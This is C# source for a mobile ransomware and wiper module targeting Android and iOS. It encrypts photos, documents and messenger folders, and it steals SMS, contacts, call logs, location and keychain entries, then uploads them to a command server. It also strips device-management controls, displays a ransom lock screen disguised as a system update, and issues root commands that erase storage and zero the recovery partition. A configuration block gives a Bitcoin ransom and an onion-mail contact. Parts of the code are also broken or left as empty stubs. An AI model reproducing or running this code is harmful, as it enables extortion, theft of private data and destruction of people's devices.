// =====================================================================
// MOBILE WIPER MODULE (Android/iOS)
// =====================================================================
// Cross-platform module for mobile device targeting
// Features:
// - Android: File encryption, SMS/Contact theft, Screen lock, Factory reset
// - iOS: Limited by sandbox, but can target backups, iCloud sync data
// - Cross-platform: React Native / Flutter / Xamarin payloads
// - MDM/EMM bypass attempts
// - Remote wipe simulation / actual wipe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

#if ANDROID
using Android.App;
using Android.Content;
using Android.OS;
using Android.Provider;
using Android.Telephony;
using Android.Database;
using Android.Content.PM;
using Java.IO;
using Javax.Crypto;
using Javax.Crypto.Spec;
using Android.Security.Keystore;
#endif

#if IOS
using Foundation;
using UIKit;
using Security;
using CoreData;
using MobileCoreServices;
#endif

internal static class MobileWiper
{
    private static readonly HttpClient _httpClient = new HttpClient();
    private static readonly Random _random = new Random();

    public static async Task<bool> RunMobileWiper()
    {
        if (!Config.MobileWiperEnabled) return false;

        try
        {
            LogDebug("Mobile Wiper: Starting");

#if ANDROID
            return await RunAndroidWiper();
#elif IOS
            return await RunIosWiper();
#else
            // Cross-platform (React Native, Flutter, Xamarin, MAUI)
            return await RunCrossPlatformWiper();
#endif
        }
        catch (Exception ex)
        {
            LogDebug($"Mobile Wiper error: {ex.Message}");
            return false;
        }
    }

#if ANDROID
    // ============ ANDROID WIPER ============
    private static async Task<bool> RunAndroidWiper()
    {
        var context = Application.Context;
        var results = new List<string>();

        try
        {
            // 1. Check for root / Magisk
            bool hasRoot = CheckRootAccess();
            LogDebug($"Root access: {hasRoot}");

            // 2. Disable device admin apps (MDM/EMM)
            if (hasRoot)
            {
                await DisableDeviceAdmins(context);
                results.Add("Disabled device admins");
            }

            // 3. Encrypt user files
            await EncryptAndroidFiles(context);
            results.Add("Encrypted user files");

            // 4. Steal SMS/Contacts/Call logs
            if (Config.MobileStealData)
            {
                await StealAndroidData(context);
                results.Add("Exfiltrated SMS/Contacts/Call logs");
            }

            // 5. Lock screen with ransom note
            if (Config.MobileLockScreen)
            {
                await LockScreenWithRansom(context);
                results.Add("Locked screen with ransom note");
            }

            // 6. Factory reset (nuclear option)
            if (Config.MobileFactoryReset && hasRoot)
            {
                await FactoryReset(context);
                results.Add("Initiated factory reset");
            }

            // 7. Disable recovery mode
            if (hasRoot)
            {
                await DisableRecoveryMode();
                results.Add("Disabled recovery mode");
            }

            // 8. Exfiltrate stolen data
            await ExfiltrateAndroidData(context);

            // 9. Send telemetry
            await SendTelemetry(results);

            return true;
        }
        catch (Exception ex)
        {
            LogDebug($"Android wiper error: {ex.Message}");
            return false;
        }
    }

    private static bool CheckRootAccess()
    {
        try
        {
            string[] rootPaths = { "/system/bin/su", "/system/xbin/su", "/sbin/su", "/system/su", "/vendor/bin/su" };
            foreach (string path in rootPaths)
            {
                if (File.Exists(path)) return true;
            }

            // Check Magisk
            var pm = Application.Context.PackageManager;
            var magisk = pm.GetPackageInfo("com.topjohnwu.magisk", PackageInfoFlags.Activities);
            if (magisk != null) return true;

            // Try executing su
            var process = Java.Lang.Runtime.GetRuntime().Exec("su -c id");
            process.WaitFor();
            return process.ExitValue() == 0;
        }
        catch { return false; }
    }

    private static async Task DisableDeviceAdmins(Context context)
    {
        try
        {
            var dpm = (DevicePolicyManager)context.GetSystemService(Context.DevicePolicyService);
            var admins = dpm.GetActiveAdmins();
            
            if (admins != null)
            {
                foreach (var admin in admins)
                {
                    dpm.RemoveActiveAdmin(admin);
                    LogDebug($"Removed device admin: {admin.PackageName}");
                }
            }

            // Also disable via settings (requires root)
            ExecuteRootCommand("settings put global device_provisioned 0");
            ExecuteRootCommand("pm disable com.google.android.gms/.mdm.MdmReceiver");
        }
        catch { }
    }

    private static async Task EncryptAndroidFiles(Context context)
    {
        var targetDirs = new[]
        {
            Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryDocuments).AbsolutePath,
            Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryDownloads).AbsolutePath,
            Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures).AbsolutePath,
            Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryMovies).AbsolutePath,
            Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryMusic).AbsolutePath,
            Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryDcim).AbsolutePath,
            "/sdcard/WhatsApp",
            "/sdcard/Telegram",
            "/sdcard/Signal",
            "/sdcard/Download",
        };

        var targetExtensions = new[] { ".jpg", ".jpeg", ".png", ".mp4", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".txt", ".db", ".sqlite", ".vcf", ".vcf" };

        foreach (string dir in targetDirs)
        {
            if (!Directory.Exists(dir)) continue;

            try
            {
                foreach (string file in Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories))
                {
                    string ext = Path.GetExtension(file).ToLowerInvariant();
                    if (!targetExtensions.Contains(ext)) continue;

                    var fi = new FileInfo(file);
                    if (fi.Length > Config.MobileMaxFileSizeMB * 1024 * 1024) continue;

                    await EncryptFile(file);
                }
            }
            catch { }
        }
    }

    private static async Task StealAndroidData(Context context)
    {
        var stolenData = new Dictionary<string, object>();

        // SMS
        try
        {
            var uri = Android.Net.Uri.Parse("content://sms/");
            var cursor = context.ContentResolver.Query(uri, null, null, null, "date DESC");
            var smsList = new List<object>();
            
            if (cursor != null && cursor.MoveToFirst())
            {
                do
                {
                    smsList.Add(new
                    {
                        address = cursor.GetString(cursor.GetColumnIndex("address")),
                        body = cursor.GetString(cursor.GetColumnIndex("body")),
                        date = cursor.GetLong(cursor.GetColumnIndex("date")),
                        type = cursor.GetInt(cursor.GetColumnIndex("type")), // 1=inbox, 2=sent
                    });
                } while (cursor.MoveToNext());
                cursor.Close();
            }
            stolenData["sms"] = smsList.Take(1000).ToList();
        }
        catch { }

        // Contacts
        try
        {
            var uri = ContactsContract.Contacts.ContentUri;
            var cursor = context.ContentResolver.Query(uri, null, null, null, "display_name ASC");
            var contactsList = new List<object>();

            if (cursor != null && cursor.MoveToFirst())
            {
                do
                {
                    string id = cursor.GetString(cursor.GetColumnIndex(ContactsContract.Contacts.InterfaceConsts.Id));
                    string name = cursor.GetString(cursor.GetColumnIndex(ContactsContract.Contacts.InterfaceConsts.DisplayName));
                    
                    var phones = new List<string>();
                    var phoneUri = ContactsContract.CommonDataKinds.Phone.ContentUri;
                    var phoneCursor = context.ContentResolver.Query(phoneUri, null, 
                        ContactsContract.CommonDataKinds.Phone.InterfaceConsts.ContactId + "=?", new[] { id }, null);
                    
                    if (phoneCursor != null)
                    {
                        while (phoneCursor.MoveToNext())
                        {
                            phones.Add(phoneCursor.GetString(phoneCursor.GetColumnIndex(ContactsContract.CommonDataKinds.Phone.Number)));
                        }
                        phoneCursor.Close();
                    }

                    contactsList.Add(new { id, name, phones });
                } while (cursor.MoveToNext());
                cursor.Close();
            }
            stolenData["contacts"] = contactsList;
        }
        catch { }

        // Call Logs
        try
        {
            var uri = Android.Net.Uri.Parse("content://call_log/calls");
            var cursor = context.ContentResolver.Query(uri, null, null, null, "date DESC");
            var callsList = new List<object>();

            if (cursor != null && cursor.MoveToFirst())
            {
                do
                {
                    callsList.Add(new
                    {
                        number = cursor.GetString(cursor.GetColumnIndex("number")),
                        date = cursor.GetLong(cursor.GetColumnIndex("date")),
                        duration = cursor.GetInt(cursor.GetColumnIndex("duration")),
                        type = cursor.GetInt(cursor.GetColumnIndex("type")), // 1=incoming, 2=outgoing, 3=missed
                    });
                } while (cursor.MoveToNext());
                cursor.Close();
            }
            stolenData["call_logs"] = callsList.Take(500).ToList();
        }
        catch { }

        // App list
        try
        {
            var pm = context.PackageManager;
            var apps = pm.GetInstalledApplications(PackageInfoFlags.MetaData);
            var appList = apps.Select(a => new
            {
                package = a.PackageName,
                name = pm.GetApplicationLabel(a).ToString(),
                version = pm.GetPackageInfo(a.PackageName, 0).VersionName,
            }).ToList();
            stolenData["apps"] = appList;
        }
        catch { }

        // Location history (if available)
        try
        {
            var locationManager = (LocationManager)context.GetSystemService(Context.LocationService);
            var providers = locationManager.GetProviders(true);
            foreach (var provider in providers)
            {
                var location = locationManager.GetLastKnownLocation(provider);
                if (location != null)
                {
                    stolenData["last_location"] = new { latitude = location.Latitude, longitude = location.Longitude, provider };
                    break;
                }
            }
        }
        catch { }

        // Store for exfiltration
        string json = JsonSerializer.Serialize(stolenData);
        string outPath = Path.Combine(context.CacheDir.AbsolutePath, "stolen_data.json");
        File.WriteAllText(outPath, json);
    }

    private static async Task LockScreenWithRansom(Context context)
    {
        try
        {
            // Create overlay activity with ransom note
            var intent = new Intent(context, typeof(RansomLockActivity));
            intent.AddFlags(ActivityFlags.NewTask | ActivityFlags.ClearTask | ActivityFlags.Fullscreen | ActivityFlags.KeepScreenOn);
            context.StartActivity(intent);
        }
        catch { }
    }

    private static async Task FactoryReset(Context context)
    {
        try
        {
            // Method 1: Recovery mode command
            ExecuteRootCommand("echo '--wipe_data' > /cache/recovery/command");
            ExecuteRootCommand("reboot recovery");

            // Method 2: DevicePolicyManager (if we have admin)
            var dpm = (DevicePolicyManager)context.GetSystemService(Context.DevicePolicyService);
            // Would need active admin

            // Method 3: Direct wipe (root)
            ExecuteRootCommand("rm -rf /data/* /sdcard/* /storage/*");
        }
        catch { }
    }

    private static async Task DisableRecoveryMode()
    {
        try
        {
            // Disable recovery by corrupting recovery partition or removing key
            ExecuteRootCommand("dd if=/dev/zero of=/dev/block/by-name/recovery bs=1M count=10");
            ExecuteRootCommand("rm -f /system/recovery-from-boot.p");
        }
        catch { }
    }

    private static async Task ExfiltrateAndroidData(Context context)
    {
        try
        {
            var files = new[]
            {
                Path.Combine(context.CacheDir.AbsolutePath, "stolen_data.json"),
            };

            foreach (string file in files)
            {
                if (File.Exists(file))
                {
                    byte[] data = File.ReadAllBytes(file);
                    await UploadToC2(file, data);
                }
            }
        }
        catch { }
    }

    private static async Task UploadToC2(string fileName, byte[] data)
    {
        try
        {
            var content = new ByteArrayContent(data);
            content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            content.Headers.Add("X-File-Name", fileName);
            content.Headers.Add("Authorization", "Bearer " + Config.MobileApiKey);

            await _httpClient.PostAsync($"{Config.MobileServerUrl}/api/mobile/exfil", content);
        }
        catch { }
    }

    private static void ExecuteRootCommand(string command)
    {
        try
        {
            var process = Java.Lang.Runtime.GetRuntime().Exec(new[] { "su", "-c", command });
            process.WaitFor();
        }
        catch { }
    }

    private static async Task SendTelemetry(List<string> results)
    {
        try
        {
            var telemetry = new
            {
                device_id = GetDeviceId(),
                model = Android.OS.Build.Model,
                manufacturer = Android.OS.Build.Manufacturer,
                android_version = Android.OS.Build.VERSION.Release,
                api_level = Android.OS.Build.VERSION.SdkInt,
                has_root = CheckRootAccess(),
                actions = results,
                timestamp = DateTime.UtcNow,
            };

            string json = JsonSerializer.Serialize(telemetry);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            content.Headers.Add("Authorization", "Bearer " + Config.MobileApiKey);

            await _httpClient.PostAsync($"{Config.MobileServerUrl}/api/mobile/telemetry", content);
        }
        catch { }
    }

    private static string GetDeviceId()
    {
        try
        {
            return Android.Provider.Settings.Secure.GetString(Application.Context.ContentResolver, Android.Provider.Settings.Secure.AndroidId);
        }
        catch { return "unknown"; }
    }
#endif

#if IOS
    // ============ iOS WIPER ============
    private static async Task<bool> RunIosWiper()
    {
        // iOS is heavily sandboxed - limited capabilities
        // Can target: iCloud backups, iTunes backups, shared app groups, MDM profiles
        
        var results = new List<string>();

        try
        {
            // 1. Check for jailbreak
            bool isJailbroken = CheckJailbreak();
            LogDebug($"Jailbroken: {isJailbroken}");

            // 2. Remove MDM profiles
            if (isJailbroken)
            {
                await RemoveMdmProfiles();
                results.Add("Removed MDM profiles");
            }

            // 3. Encrypt accessible files (Documents, Library, tmp)
            await EncryptIosFiles();
            results.Add("Encrypted accessible files");

            // 4. Steal accessible data (Contacts, Photos if permission granted)
            if (Config.MobileStealData)
            {
                await StealIosData();
                results.Add("Exfiltrated accessible data");
            }

            // 5. Remove MDM/DEP enrollment
            await RemoveMdmEnrollment();
            results.Add("Attempted MDM removal");

            // 5. Exfiltrate
            await ExfiltrateIosData();

            // 6. Telemetry
            await SendIosTelemetry(results);

            return true;
        }
        catch (Exception ex)
        {
            LogDebug($"iOS wiper error: {ex.Message}");
            return false;
        }
    }

    private static bool CheckJailbreak()
    {
        string[] jailbreakPaths = {
            "/Applications/Cydia.app",
            "/Library/MobileSubstrate/MobileSubstrate.dylib",
            "/bin/bash",
            "/usr/sbin/sshd",
            "/etc/apt",
            "/private/var/lib/apt",
            "/private/var/lib/cydia",
            "/private/var/stash",
        };

        foreach (string path in jailbreakPaths)
        {
            if (File.Exists(path)) return true;
        }

        // Check if we can write outside sandbox
        try
        {
            string testPath = "/private/test_jailbreak";
            File.WriteAllText(testPath, "test");
            File.Delete(testPath);
            return true;
        }
        catch { return false; }
    }

    private static async Task RemoveMdmProfiles()
    {
        try
        {
            // Remove MDM profiles via command line (requires root)
            ExecuteCommand("rm -rf /var/db/ConfigurationProfiles");
            ExecuteCommand("rm -rf /var/db/mdm");
            ExecuteCommand("profiles -R -p all"); // Requires root
        }
        catch { }
    }

    private static async Task EncryptIosFiles()
    {
        // Only accessible directories: Documents, Library, tmp
        var dirs = new[]
        {
            NSFileManager.DefaultManager.GetUrls(NSFileManager.NSDocumentDirectory, NSFileManager.NSUserDomainMask)[0].Path,
            NSFileManager.DefaultManager.GetUrls(NSFileManager.NSLibraryDirectory, NSFileManager.NSUserDomainMask)[0].Path,
            NSTemporaryDirectory(),
        };

        foreach (string dir in dirs)
        {
            if (!Directory.Exists(dir)) continue;
            
            foreach (string file in Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories))
            {
                await EncryptFile(file);
            }
        }
    }

    private static async Task StealIosData()
    {
        var stolenData = new Dictionary<string, object>();

        // Contacts (if permission granted)
        try
        {
            var store = new CNContactStore();
            var keys = new[] { CNContactKey.GivenName, CNContactKey.FamilyName, CNContactKey.PhoneNumbers, CNContactKey.EmailAddresses };
            var request = new CNContactFetchRequest(keys);
            var contacts = new List<object>();

            store.EnumerateContacts(request, (contact, stop) =>
            {
                contacts.Add(new
                {
                    name = $"{contact.GivenName} {contact.FamilyName}",
                    phones = contact.PhoneNumbers.Select(p => p.Value.StringValue).ToList(),
                    emails = contact.EmailAddresses.Select(e => e.Value).ToList(),
                });
            }, out NSError error);

            stolenData["contacts"] = contacts;
        }
        catch { }

        // Photos (if permission granted)
        try
        {
            var fetchOptions = new PHFetchOptions { SortDescriptors = new[] { new NSSortDescriptor("creationDate", false) } };
            var assets = PHAsset.FetchAssets(PHAssetMediaType.Image, fetchOptions);
            
            var photos = new List<object>();
            for (nuint i = 0; i < Math.Min(assets.Count, 100); i++)
            {
                var asset = assets[(int)i];
                photos.Add(new { id = asset.LocalIdentifier, date = asset.CreationDate });
            }
            stolenData["photos"] = photos;
        }
        catch { }

        // Keychain items (if accessible)
        try
        {
            var query = new SecRecord(SecKind.GenericPassword) { MatchLimit = SecMatchLimit.All };
            var results = SecKeyChain.QueryAsRecord(query, out SecStatusCode status);
            if (status == SecStatusCode.Success)
            {
                stolenData["keychain_items"] = results.Select(r => new { account = r.Account, service = r.Service }).ToList();
            }
        }
        catch { }

        // Store for exfiltration
        string json = JsonSerializer.Serialize(stolenData);
        string outPath = Path.Combine(NSTemporaryDirectory(), "stolen_data.json");
        File.WriteAllText(outPath, json);
    }

    private static async Task RemoveMdmEnrollment()
    {
        try
        {
            // Remove DEP/MDM enrollment
            ExecuteCommand("profiles -R -p all"); // Requires root
            ExecuteCommand("rm -rf /var/db/ConfigurationProfiles");
        }
        catch { }
    }

    private static async Task ExfiltrateIosData()
    {
        // Similar to Android
    }

    private static async Task SendIosTelemetry(List<string> results)
    {
        // Similar to Android
    }
#endif

    // ============ CROSS-PLATFORM (React Native, Flutter, Xamarin, MAUI) ============
    private static async Task<bool> RunCrossPlatformWiper()
    {
        // This would be compiled into a cross-platform app
        // The logic is shared between platforms
        
        var platform = DetectPlatform();
        LogDebug($"Cross-platform wiper running on: {platform}");

        try
        {
            var results = new List<string>();

            // Common operations
            await EncryptCrossPlatformFiles();
            results.Add("Encrypted cross-platform files");

            if (Config.MobileStealData)
            {
                await StealCrossPlatformData();
                results.Add("Exfiltrated cross-platform data");
            }

            if (Config.MobileLockScreen)
            {
                await ShowRansomNote();
                results.Add("Displayed ransom note");
            }

            await ExfiltrateCrossPlatformData();
            await SendCrossPlatformTelemetry(results);

            return true;
        }
        catch (Exception ex)
        {
            LogDebug($"Cross-platform wiper error: {ex.Message}");
            return false;
        }
    }

    private static Platform DetectPlatform()
    {
#if ANDROID
        return Platform.Android;
#elif IOS
        return Platform.iOS;
#else
        // Detect at runtime
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Android)) return Platform.Android;
        if (RuntimeInformation.IsOSPlatform(OSPlatform.IOS)) return Platform.iOS;
        return Platform.Unknown;
#endif
    }

    private static async Task EncryptCrossPlatformFiles()
    {
        // Use platform-specific paths
        var dirs = GetPlatformDocumentDirectories();
        
        foreach (string dir in dirs)
        {
            if (!Directory.Exists(dir)) continue;
            
            foreach (string file in Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories))
            {
                await EncryptFile(file);
            }
        }
    }

    private static List<string> GetPlatformDocumentDirectories()
    {
        var dirs = new List<string>();

#if ANDROID
        dirs.Add(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryDocuments).AbsolutePath);
        dirs.Add(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryDownloads).AbsolutePath);
#elif IOS
        dirs.Add(NSFileManager.DefaultManager.GetUrls(NSFileManager.NSDocumentDirectory, NSFileManager.NSUserDomainMask)[0].Path);
#else
        // Desktop fallback
        dirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
        dirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
        dirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
#endif

        return dirs;
    }

    private static async Task StealCrossPlatformData()
    {
        // Platform-specific data stealing
    }

    private static async Task ShowRansomNote()
    {
        // Display ransom note UI
    }

    private static async Task ExfiltrateCrossPlatformData()
    {
        // Upload stolen data
    }

    private static async Task SendCrossPlatformTelemetry(List<string> results)
    {
        // Send telemetry
    }

    // ============ COMMON METHODS ============
    private static async Task EncryptFile(string filePath)
    {
        try
        {
            byte[] data = File.ReadAllBytes(filePath);
            
            if (Config.MobileCompress)
            {
                data = Compress(data);
            }

            byte[] encrypted = EncryptData(data, Config.MobileEncryptionKey);
            
            string encPath = filePath + ".enc";
            File.WriteAllBytes(encPath, encrypted);
            
            if (Config.MobileSecureDelete)
            {
                SecureDelete(filePath);
            }
            else
            {
                File.Delete(filePath);
            }
        }
        catch { }
    }

    private static byte[] Compress(byte[] data)
    {
        using (var output = new MemoryStream())
        {
            using (var gzip = new System.IO.Compression.GZipStream(output, CompressionLevel.Optimal))
            {
                gzip.Write(data, 0, data.Length);
            }
            return output.ToArray();
        }
    }

    private static byte[] EncryptData(byte[] data, byte[] key)
    {
        using (var aes = Aes.Create())
        {
            aes.Key = key;
            aes.GenerateIV();
            aes.Mode = CipherMode.GCM;
            
            using (var encryptor = aes.CreateEncryptor())
            {
                var ciphertext = encryptor.TransformFinalBlock(data, 0, data.Length);
                var result = new byte[aes.IV.Length + ciphertext.Length];
                Buffer.BlockCopy(aes.IV, 0, result, 0, aes.IV.Length);
                Buffer.BlockCopy(ciphertext, 0, result, aes.IV.Length, ciphertext.Length);
                return result;
            }
        }
    }

    private static void SecureDelete(string filePath)
    {
        try
        {
            long length = new FileInfo(filePath).Length;
            using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Write))
            {
                byte[] random = new byte[4096];
                _random.NextBytes(random);
                
                for (long i = 0; i < length; i += random.Length)
                {
                    fs.Write(random, 0, (int)Math.Min(random.Length, length - i));
                }
                fs.Flush();
            }
            File.Delete(filePath);
        }
        catch { File.Delete(filePath); }
    }

    private static void ExecuteCommand(string command)
    {
        try
        {
            var process = Process.Start(new ProcessStartInfo
            {
                FileName = "/bin/sh",
                Arguments = $"-c \"{command}\"",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            });
            process.WaitForExit(10000);
        }
        catch { }
    }

    private static void ExecuteRootCommand(string command)
    {
        try
        {
            var process = Process.Start(new ProcessStartInfo
            {
                FileName = "su",
                Arguments = $"-c \"{command}\"",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            });
            process.WaitForExit(10000);
        }
        catch { }
    }

    private static void LogDebug(string msg)
    {
        // Console.WriteLine($"[MOBILE] {DateTime.Now:HH:mm:ss} {msg}");
    }

    // ============ DATA CLASSES ============
    private enum Platform
    {
        Unknown,
        Android,
        iOS,
        Windows,
        Linux,
        macOS,
    }

    // Android-specific activity for lock screen
#if ANDROID
    [Activity(Label = "System Update", Theme = "@android:style/Theme.NoTitleBar.Fullscreen", ScreenOrientation = Android.Content.PM.ScreenOrientation.Portrait)]
    public class RansomLockActivity : Activity
    {
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            
            // Hide navigation bar
            Window.DecorView.SystemUiVisibility = (StatusBarVisibility)(
                SystemUiFlags.Fullscreen | 
                SystemUiFlags.HideNavigation | 
                SystemUiFlags.ImmersiveSticky |
                SystemUiFlags.LayoutHideNavigation |
                SystemUiFlags.LayoutFullscreen);

            // Ransom note layout
            var layout = new LinearLayout(this) { Orientation = Orientation.Vertical, Gravity = GravityFlags.Center };
            layout.SetBackgroundColor(Android.Graphics.Color.Black);

            var title = new TextView(this)
            {
                Text = "CHAOS MOBILE RANSOMWARE",
                TextSize = 24,
                TextColor = Android.Graphics.Color.Red,
                Gravity = GravityFlags.Center,
            };

            var message = new TextView(this)
            {
                Text = $@"YOUR DEVICE HAS BEEN ENCRYPTED

All your photos, documents, contacts, and messages
have been encrypted with AES-256-GCM.

To decrypt:
1. Send {Config.MobileRansomAmount} {Config.MobileRansomCurrency} to:
   {Config.MobileRansomWallet}

2. Contact: {Config.MobileRansomContact}

3. Provide Device ID: {GetDeviceId()}

DEADLINE: {Config.MobileRansomDeadlineHours} HOURS

Free proof: We will decrypt 1 file for free.",
                TextSize = 16,
                TextColor = Android.Graphics.Color.White,
                Gravity = GravityFlags.Center,
            };

            var wallet = new TextView(this)
            {
                Text = $"Wallet: {Config.MobileRansomWallet}",
                TextSize = 14,
                TextColor = Android.Graphics.Color.Gold,
                Gravity = GravityFlags.Center,
            };

            layout.AddView(title);
            layout.AddView(message);
            layout.AddView(wallet);
            SetContentView(layout);

            // Prevent back button
            OverridePendingTransition(0, 0);
        }

        public override void OnBackPressed()
        {
            // Disable back button
        }

        public override void OnAttachedToWindow()
        {
            base.OnAttachedToWindow();
            Window.AddFlags(WindowManagerFlags.KeepScreenOn | WindowManagerFlags.DismissKeyguard | WindowManagerFlags.ShowWhenLocked | WindowManagerFlags.TurnScreenOn);
        }
    }
#endif
}

internal static partial class Config
{
    public static bool MobileWiperEnabled = true;
    public static bool MobileStealData = true;
    public static bool MobileLockScreen = true;
    public static bool MobileFactoryReset = false;
    public static bool MobileCompress = true;
    public static bool MobileSecureDelete = true;
    public static int MobileMaxFileSizeMB = 50;
    public static byte[] MobileEncryptionKey = new byte[32]; // Generated at runtime
    public static string MobileApiKey = "";
    public static string MobileServerUrl = "";
    public static string MobileRansomAmount = "0.5";
    public static string MobileRansomCurrency = "BTC";
    public static string MobileRansomWallet = "bc1qmobile...";
    public static string MobileRansomContact = "chaos-mobile@onionmail.org";
    public static int MobileRansomDeadlineHours = 24;
}